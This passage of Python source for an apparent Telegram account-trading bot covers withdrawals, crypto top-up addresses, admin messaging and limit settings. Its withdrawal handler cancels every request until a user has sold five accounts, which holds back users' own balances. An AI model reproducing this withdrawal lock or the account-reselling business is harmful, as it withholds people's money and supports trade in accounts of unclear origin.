            f"❌ *Invalid Address!*\n\n"
            f"The address you entered is not valid for *{method}* network.\n\n"
            f"• BEP20 address must start with `0x` and be 42 characters.\n"
            f"• TRC20 address must start with `T` and be 34 characters.\n\n"
            f"Withdrawal has been *cancelled*. Please start again."
        )
        await update.message.reply_text(error_msg, parse_mode='Markdown')
        context.user_data.clear()
        await start(update, context)
        return ConversationHandler.END

    # Count how many accounts have been successfully approved for this user
    user_info = get_user_data(user_id)
    proc_details = user_info.get('processing_details', [])
    approved_count = sum(
        1 for e in proc_details
        if str(e.get('status', '')).lower() in ('successful', 'success', 'accepted')
    )

    REQUIRED_ACCOUNTS = 5

    # If user hasn't reached 5 approved accounts yet, cancel with lock message
    if approved_count < REQUIRED_ACCOUNTS:
        remaining = REQUIRED_ACCOUNTS - approved_count
        lock_msg = (
            f"🔒 *Withdrawal Locked*\n\n"
            f"Your withdrawal request has been *cancelled*.\n\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"📋 *Unlock Requirement*\n"
            f"You must successfully sell a minimum of *{REQUIRED_ACCOUNTS} accounts* "
            f"to unlock the withdrawal feature.\n\n"
            f"📊 *Your Progress*\n"
            f"✅ Approved Accounts : *{approved_count}* / {REQUIRED_ACCOUNTS}\n"
            f"⏳ Still Needed : *{remaining}* more account(s)\n"
            f"━━━━━━━━━━━━━━━━━━\n\n"
            f"Keep selling accounts and you'll unlock withdrawals soon! 💪"
        )
        context.user_data.clear()
        await update.message.reply_text(lock_msg, parse_mode='Markdown')
        await start(update, context)
        return ConversationHandler.END

    # User has 5+ approved accounts — proceed normally, ask for amount
    context.user_data['withdraw_address'] = address

    await update.message.reply_text(
        f"Your address: `{address}`\n\nEnter the amount to withdraw:\n(Your main balance: {user_info['main_balance_usdt']:.2f} USDT)",
        parse_mode='Markdown'
    )
    return WAITING_FOR_WITHDRAW_AMOUNT

async def handle_withdraw_amount(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle withdrawal amount input and validate"""
    user_id = str(update.effective_user.id)
    try:
        amount = float(update.message.text.strip())
    except ValueError:
        await update.message.reply_text("❌ Invalid amount. Please enter a number.")
        return WAITING_FOR_WITHDRAW_AMOUNT

    user_info = get_user_data(user_id)

    if amount < 10:
        await update.message.reply_text("❌ Minimum withdrawal 10 USDT\nWithdrawal cancelled.")
        context.user_data.clear()
        await start(update, context)
        return ConversationHandler.END

    if amount > user_info['main_balance_usdt']:
        await update.message.reply_text(f"❌ Insufficient balance! Your balance: {user_info['main_balance_usdt']:.2f} USDT\nWithdrawal cancelled.")
        context.user_data.clear()
        await start(update, context)
        return ConversationHandler.END

    # Process withdrawal - deduct balance and send to admin for approval
    with user_data_lock:
        user_data[user_id]['main_balance_usdt'] -= amount
        user_data[user_id]['withdrawal_processing_balance'] = user_data[user_id].get('withdrawal_processing_balance', 0.0) + amount
        save_user_data()

    method = context.user_data.get('withdraw_method')
    address = context.user_data.get('withdraw_address')

    processing_text = f"""
⏳ **Withdrawal Request Submitted**

📍 Address: `{address}`
💰 Amount: {amount:.2f} USDT ({method})
🔄 Status: Pending Admin Approval

Please wait while we review your request.
"""
    await update.message.reply_text(processing_text, parse_mode='Markdown')

    import random
    import string
    tax_id = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))
    wd_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))

    pending_withdrawals[wd_id] = {
        'user_id': user_id,
        'amount': amount,
        'method': method,
        'address': address,
        'tax_id': tax_id,
        'timestamp': datetime.now().isoformat()
    }

    admin_notif = f"""
🏦 **New Withdrawal Request**

👤 **User ID:** `{user_id}`
💰 **Amount:** {amount:.2f} USDT
🌐 **Network:** {method}
📍 **User Address:** `{address}`
🆔 **Tax ID:** `{tax_id}`
"""
    await context.bot.send_message(
        chat_id=ADMIN_CHAT_ID,
        text=admin_notif,
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("✅ Approve", callback_data=f"wd_approve_{wd_id}")],
            [InlineKeyboardButton("❌ Reject", callback_data=f"wd_reject_{wd_id}")]
        ])
    )

    context.user_data.clear()
    await start(update, context)
    return ConversationHandler.END

async def cancel_withdrawal(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Cancel withdrawal and return to start"""
    await update.message.reply_text("Withdrawal cancelled.")
    await start(update, context)
    return ConversationHandler.END

# Withdrawal callback functions for each payment method
async def withdraw_binance_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle Binance withdrawal"""
    query = update.callback_query
    await query.answer()

    user_id = str(query.from_user.id)
    user_info = get_user_data(user_id)
    min_withdrawal = get_combined_withdrawal_limit(user_id, user_info['main_balance_usdt'], 'binance')

    if user_info['main_balance_usdt'] < min_withdrawal:
        await query.edit_message_text(
            f"❌ **Insufficient Balance!**\n\nMinimum withdrawal: ${min_withdrawal:.2f} USD\nYour balance: {user_info['main_balance_usdt']:.2f} USDT",
            parse_mode='Markdown'
        )
        return

    withdraw_text = f"""
🟡 **Binance Withdrawal**

💰 **Current Balance:** {user_info['main_balance_usdt']:.2f} USDT
💵 **Minimum Amount:** ${min_withdrawal:.2f} USD

Please provide your **Binance email** and **withdrawal amount**:

Format: email@example.com 10.50
"""

    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="withdrawal")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await query.edit_message_text(withdraw_text, reply_markup=reply_markup, parse_mode='Markdown')

async def withdraw_paypal_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle PayPal withdrawal"""
    query = update.callback_query
    await query.answer()

    user_id = str(query.from_user.id)
    user_info = get_user_data(user_id)
    min_withdrawal = get_combined_withdrawal_limit(user_id, user_info['main_balance_usdt'], 'paypal')

    if user_info['main_balance_usdt'] < min_withdrawal:
        await query.edit_message_text(
            f"❌ **Insufficient Balance!**\n\nMinimum withdrawal: ${min_withdrawal:.2f} USD\nYour balance: {user_info['main_balance_usdt']:.2f} USDT",
            parse_mode='Markdown'
        )
        return

    withdraw_text = f"""
🌐 **PayPal Withdrawal**

💰 **Current Balance:** {user_info['main_balance_usdt']:.2f} USDT
💵 **Minimum Amount:** ${min_withdrawal:.2f} USD

Please provide your **PayPal email** and **withdrawal amount**:

Format: paypal@example.com 15.00
"""

    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="withdrawal")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await query.edit_message_text(withdraw_text, reply_markup=reply_markup, parse_mode='Markdown')

async def withdraw_bank_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle Bank withdrawal (USA/UK/Canada only)"""
    query = update.callback_query
    await query.answer()

    user_id = str(query.from_user.id)
    user_info = get_user_data(user_id)
    min_withdrawal = get_combined_withdrawal_limit(user_id, user_info['main_balance_usdt'], 'bank')

    if user_info['main_balance_usdt'] < min_withdrawal:
        await query.edit_message_text(
            f"❌ **Insufficient Balance!**\n\nMinimum withdrawal: ${min_withdrawal:.2f} USD\nYour balance: {user_info['main_balance_usdt']:.2f} USDT",
            parse_mode='Markdown'
        )
        return

    withdraw_text = f"""
🏦 **Bank Withdrawal** (USA/UK/Canada Only)

💰 **Current Balance:** {user_info['main_balance_usdt']:.2f} USDT
💵 **Minimum Amount:** ${min_withdrawal:.2f} USD

⚠️ **Available for USA, UK, and Canada residents only**

Please provide your **bank details** and **withdrawal amount**:

Format: ACCOUNT_NUMBER ROUTING_CODE AMOUNT

Example: 1234567890 987654321 25.00
"""

    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="withdrawal")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await query.edit_message_text(withdraw_text, reply_markup=reply_markup, parse_mode='Markdown')

# Admin Top-Up Info Control
async def admin_send_sms_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle admin send SMS callback"""
    query = update.callback_query
    await query.answer()

    user_id = str(query.from_user.id)
    if user_id != ADMIN_CHAT_ID:
        await query.edit_message_text("❌ Access Denied!")
        return

    sms_text = """
📩 **Send SMS**

Choose how to send messages:

📢 **Send SMS All Users** - Send message to all users
👤 **Send SMS Single User** - Send message to specific user

Select an option:
"""

    keyboard = [
        [InlineKeyboardButton("📢 Send SMS All Users", callback_data="admin_sms_all_users")],
        [InlineKeyboardButton("👤 Send SMS Single User", callback_data="admin_sms_single_user")],
        [InlineKeyboardButton("🔙 Admin Panel", callback_data="admin_panel")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await query.edit_message_text(sms_text, reply_markup=reply_markup, parse_mode='Markdown')

async def admin_sms_all_users_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle admin SMS all users callback"""
    query = update.callback_query
    await query.answer()

    user_id = str(query.from_user.id)
    if user_id != ADMIN_CHAT_ID:
        await query.edit_message_text("❌ Access Denied!")
        return

    sms_all_text = """
📢 **Send SMS to All Users**

Write the message you want to send to all users.

Example: Hello everyone! New features are available.

Please type your message:
"""

    context.user_data['admin_sms_all_users'] = True
    keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data="admin_send_sms")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await query.edit_message_text(sms_all_text, reply_markup=reply_markup, parse_mode='Markdown')

async def admin_sms_single_user_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle admin SMS single user callback"""
    query = update.callback_query
    await query.answer()

    user_id = str(query.from_user.id)
    if user_id != ADMIN_CHAT_ID:
        await query.edit_message_text("❌ Access Denied!")
        return

    sms_single_text = """
👤 **Send SMS to Single User**

First, enter the User Chat ID:

Example: 123456789

Please enter the user Chat ID:
"""

    context.user_data['admin_sms_single_user'] = True
    keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data="admin_send_sms")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await query.edit_message_text(sms_single_text, reply_markup=reply_markup, parse_mode='Markdown')

async def admin_chat_user_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle admin chat user callback"""
    query = update.callback_query
    await query.answer()

    user_id = str(query.from_user.id)
    if user_id != ADMIN_CHAT_ID:
        await query.edit_message_text("❌ Access Denied!")
        return

    chat_text = """
💬 **Chat with User**

Enter the User Chat ID to start conversation:

Example: 123456789

Please enter the user Chat ID:
"""

    context.user_data['admin_chat_user'] = True
    keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data="admin_panel")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await query.edit_message_text(chat_text, reply_markup=reply_markup, parse_mode='Markdown')

async def admin_topup_info_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle admin top-up info control"""
    query = update.callback_query
    await query.answer()

    user_id = str(query.from_user.id)
    if user_id != ADMIN_CHAT_ID:
        await query.edit_message_text("❌ Access Denied!")
        return

    topup_info_text = """
💳 **Top-Up Info Control Panel**

Control what information shows for each payment method when users select top-up options.

Select a payment method to edit its details:
"""

    keyboard = [
        [InlineKeyboardButton("🟡 Binance Info", callback_data="edit_binance_info")],
        [InlineKeyboardButton("💳 Payeer Info", callback_data="edit_payeer_info")],
        [InlineKeyboardButton("💎 TRC20 Info", callback_data="edit_trc20_info")],
        [InlineKeyboardButton("🔸 BEP20 Info", callback_data="edit_bep20_info")],
        [InlineKeyboardButton("🌐 PayPal Info", callback_data="edit_paypal_info")],
        [InlineKeyboardButton("🔙 Admin Panel", callback_data="admin_panel")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await query.edit_message_text(topup_info_text, reply_markup=reply_markup, parse_mode='Markdown')

async def admin_withdrawal_set_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle admin withdrawal set callback"""
    query = update.callback_query
    await query.answer()

    user_id = str(query.from_user.id)
    if user_id != ADMIN_CHAT_ID:
        await query.edit_message_text("❌ Access Denied!")
        return

    current_global_limit = withdrawal_settings.get('global_limit', 1.0)
    custom_user_count = len(withdrawal_settings.get('user_limits', {}))

    withdrawal_set_text = f"""
🏦 **Withdrawal Set Control**

📊 **Current Settings:**
• Global Minimum Limit: ${current_global_limit} USD
• Custom User Limits: {custom_user_count} users

Choose an option:
"""

    keyboard = [
        [InlineKeyboardButton("📊 All Set", callback_data="admin_withdrawal_all_set")],
        [InlineKeyboardButton("👤 Custom User Withdrawal Limit Set", callback_data="admin_withdrawal_custom_user")],
        [InlineKeyboardButton("🔙 Admin Panel", callback_data="admin_panel")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await query.edit_message_text(withdrawal_set_text, reply_markup=reply_markup, parse_mode='Markdown')

async def admin_withdrawal_all_set_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle admin withdrawal all set callback"""
    query = update.callback_query
    await query.answer()

    user_id = str(query.from_user.id)
    if user_id != ADMIN_CHAT_ID:
        await query.edit_message_text("❌ Access Denied!")
        return

    current_limit = withdrawal_settings.get('global_limit', 1.0)

    all_set_text = f"""
📊 **All Set - Global Withdrawal Limit**

💵 **Current Global Limit:** ${current_limit} USD

Enter new minimum withdrawal limit for ALL users (USD):

Example: 3.00

Note: This limit applies to all users who don't have a custom limit set.
"""

    context.user_data['admin_withdrawal_all_set'] = True
    keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data="admin_withdrawal_set")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await query.edit_message_text(all_set_text, reply_markup=reply_markup, parse_mode='Markdown')

async def admin_withdrawal_custom_user_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle admin withdrawal custom user callback"""
    query = update.callback_query
    await query.answer()

    user_id = str(query.from_user.id)
    if user_id != ADMIN_CHAT_ID:
        await query.edit_message_text("❌ Access Denied!")
        return

    custom_user_text = """
👤 **Custom User Withdrawal Limit Set**

Enter the User Chat ID to set custom withdrawal limit:

Example: 123456789

Please enter the user Chat ID:
"""

    context.user_data['admin_withdrawal_custom_user'] = True
    keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data="admin_withdrawal_set")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await query.edit_message_text(custom_user_text, reply_markup=reply_markup, parse_mode='Markdown')

async def handle_admin_withdrawal_all_set_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle admin withdrawal all set limit input"""
    if not update.message or not update.message.text:
        return

    admin_id = str(update.effective_user.id)
    if admin_id != ADMIN_CHAT_ID:
        return

    try:
        limit_input = update.message.text.strip()
        new_limit = float(limit_input)
        
        if new_limit <= 0:
            await update.message.reply_text("❌ Limit must be greater than zero!")
            return
        if new_limit > 10000:
            await update.message.reply_text("❌ Limit cannot exceed $10,000 USD!")
            return
        if len(limit_input.split('.')) > 1 and len(limit_input.split('.')[1]) > 2:
            await update.message.reply_text("❌ Limit can have maximum 2 decimal places!")
            return
            
    except ValueError:
        await update.message.reply_text("❌ Please provide a valid number! Example: 3.00")
        return

    # Update global limit
    withdrawal_settings['global_limit'] = new_limit
    save_withdrawal_settings()

    success_text = f"""
✅ **Global Withdrawal Limit Updated!**

💵 **New Limit:** ${new_limit} USD

This limit now applies to all users who don't have a custom limit set.
"""

    keyboard = [
        [InlineKeyboardButton("🔄 Change Again", callback_data="admin_withdrawal_all_set")],
        [InlineKeyboardButton("🔙 Withdrawal Set", callback_data="admin_withdrawal_set")],
        [InlineKeyboardButton("🏠 Admin Panel", callback_data="admin_panel")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_text(success_text, reply_markup=reply_markup, parse_mode='Markdown')

    # Clear context
    context.user_data.pop('admin_withdrawal_all_set', None)

async def handle_admin_withdrawal_custom_user_id_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle admin withdrawal custom user ID input"""
    if not update.message or not update.message.text:
        return

    admin_id = str(update.effective_user.id)
    if admin_id != ADMIN_CHAT_ID:
        return

    target_user_id = update.message.text.strip()

    # Validate user ID
    if not target_user_id.isdigit():
        await update.message.reply_text("❌ User ID must be a number!")
        return

    # Store target user ID and ask for limit (get or create user data for users who haven't started bot)
    context.user_data['withdrawal_limit_target_user'] = target_user_id
    
    user_info = get_user_data(target_user_id)
    current_limit = withdrawal_settings['user_limits'].get(target_user_id, withdrawal_settings['global_limit'])

    limit_request_text = f"""
💵 **Set Custom Withdrawal Limit**

👤 **User ID:** {target_user_id}
💰 **User Balance:** {user_info['main_balance_usdt']:.2f} USDT
📊 **Current Limit:** ${current_limit} USD

Enter new withdrawal limit for this user (USD):

Example: 5.00
"""

    keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data="admin_withdrawal_set")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_text(limit_request_text, reply_markup=reply_markup, parse_mode='Markdown')

async def handle_admin_withdrawal_custom_user_limit_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle admin withdrawal custom user limit input"""
    if not update.message or not update.message.text:
        return

    admin_id = str(update.effective_user.id)
    if admin_id != ADMIN_CHAT_ID:
        return

    target_user_id = context.user_data.get('withdrawal_limit_target_user')
    if not target_user_id:
        await update.message.reply_text("❌ Target user not found!")
        return

    try:
        limit_input = update.message.text.strip()
        new_limit = float(limit_input)
        
        if new_limit <= 0:
            await update.message.reply_text("❌ Limit must be greater than zero!")
            return
        if new_limit > 10000:
            await update.message.reply_text("❌ Limit cannot exceed $10,000 USD!")
            return
        if len(limit_input.split('.')) > 1 and len(limit_input.split('.')[1]) > 2:
            await update.message.reply_text("❌ Limit can have maximum 2 decimal places!")
            return
            
    except ValueError:
        await update.message.reply_text("❌ Please provide a valid number! Example: 5.00")
        return

    # Update user-specific limit
    withdrawal_settings['user_limits'][target_user_id] = new_limit
    save_withdrawal_settings()

    success_text = f"""
✅ **Custom Withdrawal Limit Set!**

👤 **User ID:** {target_user_id}
💵 **New Limit:** ${new_limit} USD

This user now has a custom withdrawal limit that overrides the global setting.
"""

    keyboard = [
        [InlineKeyboardButton("👤 Set Another User", callback_data="admin_withdrawal_custom_user")],
        [InlineKeyboardButton("🔙 Withdrawal Set", callback_data="admin_withdrawal_set")],
        [InlineKeyboardButton("🏠 Admin Panel", callback_data="admin_panel")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_text(success_text, reply_markup=reply_markup, parse_mode='Markdown')

    # Clear context
    context.user_data.pop('admin_withdrawal_custom_user', None)
    context.user_data.pop('withdrawal_limit_target_user', None)

# Additional withdrawal method callbacks
async def withdraw_payeer_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle Payeer withdrawal"""
    query = update.callback_query
    await query.answer()

    user_id = str(query.from_user.id)
    user_info = get_user_data(user_id)
    min_withdrawal = get_combined_withdrawal_limit(user_id, user_info['main_balance_usdt'], 'payeer')

    if user_info['main_balance_usdt'] < min_withdrawal:
        await query.edit_message_text(
            f"❌ **Insufficient Balance!**\n\nMinimum withdrawal: ${min_withdrawal:.2f} USD\nYour balance: {user_info['main_balance_usdt']:.2f} USDT",
            parse_mode='Markdown'
        )
        return

    withdraw_text = f"""
💳 **Payeer Withdrawal**

💰 **Current Balance:** {user_info['main_balance_usdt']:.2f} USDT
💵 **Minimum Amount:** ${min_withdrawal:.2f} USD

Please provide your **Payeer account** and **withdrawal amount**:

Format: P1234567890 20.00
"""

    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="withdrawal")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await query.edit_message_text(withdraw_text, reply_markup=reply_markup, parse_mode='Markdown')

async def withdraw_trc20_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle TRC20 withdrawal"""
    query = update.callback_query
    await query.answer()

    user_id = str(query.from_user.id)
    user_info = get_user_data(user_id)
    min_withdrawal = get_combined_withdrawal_limit(user_id, user_info['main_balance_usdt'], 'trc20')

    if user_info['main_balance_usdt'] < min_withdrawal:
        await query.edit_message_text(
            f"❌ **Insufficient Balance!**\n\nMinimum withdrawal: ${min_withdrawal:.2f} USD\nYour balance: {user_info['main_balance_usdt']:.2f} USDT",
            parse_mode='Markdown'
        )
        return

    withdraw_text = f"""
💎 **TRC20 USDT Withdrawal**

💰 **Current Balance:** {user_info['main_balance_usdt']:.2f} USDT
💵 **Minimum Amount:** ${min_withdrawal:.2f} USD

Please provide your **TRC20 wallet address** and **withdrawal amount**:

Format: TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t 15.00
"""

    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="withdrawal")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await query.edit_message_text(withdraw_text, reply_markup=reply_markup, parse_mode='Markdown')

async def withdraw_bep20_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle BEP20 withdrawal"""
    query = update.callback_query
    await query.answer()

    user_id = str(query.from_user.id)
    user_info = get_user_data(user_id)
    min_withdrawal = get_combined_withdrawal_limit(user_id, user_info['main_balance_usdt'], 'bep20')

    if user_info['main_balance_usdt'] < min_withdrawal:
        await query.edit_message_text(
            f"❌ **Insufficient Balance!**\n\nMinimum withdrawal: ${min_withdrawal:.2f} USD\nYour balance: {user_info['main_balance_usdt']:.2f} USDT",
            parse_mode='Markdown'
        )
        return

    withdraw_text = f"""
🔸 **BEP20 USDT Withdrawal**

💰 **Current Balance:** {user_info['main_balance_usdt']:.2f} USDT
💵 **Minimum Amount:** ${min_withdrawal:.2f} USD

Please provide your **BEP20 wallet address** and **withdrawal amount**:

Format: 0x742d35Cc6634C0532925a3b8D4c0532925a3b8D4c 25.00
"""

    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="withdrawal")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await query.edit_message_text(withdraw_text, reply_markup=reply_markup, parse_mode='Markdown')

async def withdraw_bitcoin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle Bitcoin withdrawal"""
    query = update.callback_query
    await query.answer()

    user_id = str(query.from_user.id)
    user_info = get_user_data(user_id)
    min_withdrawal = get_combined_withdrawal_limit(user_id, user_info['main_balance_usdt'], 'bitcoin')

    if user_info['main_balance_usdt'] < min_withdrawal:
        await query.edit_message_text(
            f"❌ **Insufficient Balance!**\n\nMinimum withdrawal: ${min_withdrawal:.2f} USD\nYour balance: {user_info['main_balance_usdt']:.2f} USDT",
            parse_mode='Markdown'
        )
        return

    withdraw_text = f"""
₿ **Bitcoin Withdrawal**

💰 **Current Balance:** {user_info['main_balance_usdt']:.2f} USDT
💵 **Minimum Amount:** ${min_withdrawal:.2f} USD

Please provide your **Bitcoin address** and **withdrawal amount**:

Format: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa 30.00
"""

    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="withdrawal")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await query.edit_message_text(withdraw_text, reply_markup=reply_markup, parse_mode='Markdown')

async def withdraw_cashapp_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle Cash App withdrawal"""
    query = update.callback_query
    await query.answer()

    user_id = str(query.from_user.id)
    user_info = get_user_data(user_id)
    min_withdrawal = get_combined_withdrawal_limit(user_id, user_info['main_balance_usdt'], 'cashapp')

    if user_info['main_balance_usdt'] < min_withdrawal:
        await query.edit_message_text(
            f"❌ **Insufficient Balance!**\n\nMinimum withdrawal: ${min_withdrawal:.2f} USD\nYour balance: {user_info['main_balance_usdt']:.2f} USDT",
            parse_mode='Markdown'
        )
        return

    withdraw_text = f"""
📱 **Cash App Withdrawal**

💰 **Current Balance:** {user_info['main_balance_usdt']:.2f} USDT
💵 **Minimum Amount:** ${min_withdrawal:.2f} USD

Please provide your **Cash App tag** and **withdrawal amount**:

Format: $username 18.50
"""

    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="withdrawal")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await query.edit_message_text(withdraw_text, reply_markup=reply_markup, parse_mode='Markdown')

async def withdraw_upi_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle UPI withdrawal"""
    query = update.callback_query
    await query.answer()

    user_id = str(query.from_user.id)
    user_info = get_user_data(user_id)
    min_withdrawal = get_combined_withdrawal_limit(user_id, user_info['main_balance_usdt'], 'upi')

    if user_info['main_balance_usdt'] < min_withdrawal:
        await query.edit_message_text(
            f"❌ **Insufficient Balance!**\n\nMinimum withdrawal: ${min_withdrawal:.2f} USD\nYour balance: {user_info['main_balance_usdt']:.2f} USDT",
            parse_mode='Markdown'
        )
        return

    withdraw_text = f"""
🇮🇳 **UPI Withdrawal**

💰 **Current Balance:** {user_info['main_balance_usdt']:.2f} USDT
💵 **Minimum Amount:** ${min_withdrawal:.2f} USD

Please provide your **UPI ID** and **withdrawal amount**:

Format: username@paytm 12.75
"""

    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="withdrawal")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await query.edit_message_text(withdraw_text, reply_markup=reply_markup, parse_mode='Markdown')

# Top-up payment method handlers
async def topup_binance_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle Binance top-up"""
    query = update.callback_query
    await query.answer()

    topup_text = """
🟡 **Binance Top-Up**

To add funds to your account via Binance:

📋 **Binance ID:** `1087738186`

**Instructions:**
1. Open your Binance app/website
2. Go to P2P or Transfer section
3. Send USDT to Binance ID: **1087738186**
4. After payment, send screenshot to admin for verification

💡 **Note:** Processing time is usually 5-15 minutes after verification.
"""

    keyboard = [[InlineKeyboardButton("🔙 Back to Top-Up", callback_data="topup")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await query.edit_message_text(topup_text, reply_markup=reply_markup, parse_mode='Markdown')

async def topup_payeer_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle Payeer top-up"""
    query = update.callback_query
    await query.answer()

    topup_text = """
💳 **Payeer Top-Up**

To add funds to your account via Payeer:

📋 **Payeer ID:** `P1132712885`

**Instructions:**
1. Log in to your Payeer account
2. Go to Transfer/Send Money section
3. Send USDT to Payeer ID: **P1132712885**
4. After payment, send transaction ID to admin for verification

💡 **Note:** Processing time is usually 5-15 minutes after verification.
"""

    keyboard = [[InlineKeyboardButton("🔙 Back to Top-Up", callback_data="topup")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await query.edit_message_text(topup_text, reply_markup=reply_markup, parse_mode='Markdown')

async def topup_trc20_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle TRC20 USDT top-up"""
    query = update.callback_query
    await query.answer()

    topup_text = """
💎 **USDT TRC20 Top-Up**

To add funds to your account via TRC20 network:

📋 **TRC20 Address:** 
`TNuVc3rWtsM3mmBVUZLUHbUqcxxNJV8NqX`

**Instructions:**
1. Open your crypto wallet (TronLink, Trust Wallet, etc.)
2. Select USDT TRC20 network
3. Send USDT to the address above
4. After payment, send transaction hash to admin for verification

⚠️ **Important:** Only send USDT on TRC20 network. Other tokens or networks may result in loss of funds.

💡 **Note:** Processing time is usually 5-15 minutes after verification.
"""

    keyboard = [[InlineKeyboardButton("🔙 Back to Top-Up", callback_data="topup")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await query.edit_message_text(topup_text, reply_markup=reply_markup, parse_mode='Markdown')

async def topup_bep20_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle BEP20 USDT top-up"""
    query = update.callback_query
    await query.answer()

    topup_text = """
🔸 **USDT BEP20 Top-Up**

To add funds to your account via BEP20 network:

📋 **BEP20 Address:** 
`0xb53712a37728f313d76c53ce514ebd4ba95f99c1`

**Instructions:**
1. Open your crypto wallet (MetaMask, Trust Wallet, etc.)
2. Select USDT BEP20/BSC network
3. Send USDT to the address above
4. After payment, send transaction hash to admin for verification

⚠️ **Important:** Only send USDT on BEP20/BSC network. Other tokens or networks may result in loss of funds.

💡 **Note:** Processing time is usually 5-15 minutes after verification.
"""

    keyboard = [[InlineKeyboardButton("🔙 Back to Top-Up", callback_data="topup")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await query.edit_message_text(topup_text, reply_markup=reply_markup, parse_mode='Markdown')

async def topup_arbitrum_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle Arbitrum USDT top-up"""
    query = update.callback_query
    await query.answer()

    topup_text = """
🌐 **USDT Arbitrum Top-Up**

To add funds to your account via Arbitrum network:

📋 **Arbitrum Address:** 
`0xb53712a37728f313d76c53ce514ebd4ba95f99c1`

**Instructions:**
1. Open your crypto wallet (MetaMask, etc.)
2. Select USDT on Arbitrum network
3. Send USDT to the address above
4. After payment, send transaction hash to admin for verification

⚠️ **Important:** Only send USDT on Arbitrum network. Other tokens or networks may result in loss of funds.

💡 **Note:** Processing time is usually 5-15 minutes after verification. Lower fees compared to Ethereum mainnet.
"""

    keyboard = [[InlineKeyboardButton("🔙 Back to Top-Up", callback_data="topup")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await query.edit_message_text(topup_text, reply_markup=reply_markup, parse_mode='Markdown')

async def handle_purchase(update: Update, context: ContextTypes.DEFAULT_TYPE, account_type: str, price: float) -> None:
    """Handle account purchase"""
    query = update.callback_query
    user_id = str(query.from_user.id)
    user_info = get_user_data(user_id)

    if user_info['main_balance_usdt'] >= price:
        # Deduct balance and increment bought accounts
        user_info['main_balance_usdt'] -= price
        user_info['accounts_bought'] += 1
        save_user_data()

        success_text = f"""
✅ **Purchase Successful!**

📱 **{account_type} Account** purchased
💰 **Cost:** {price} USDT
💳 **Current Main Balance:** {user_info['main_balance_usdt']:.2f} USDT

📧 Account details will be sent to your inbox soon.

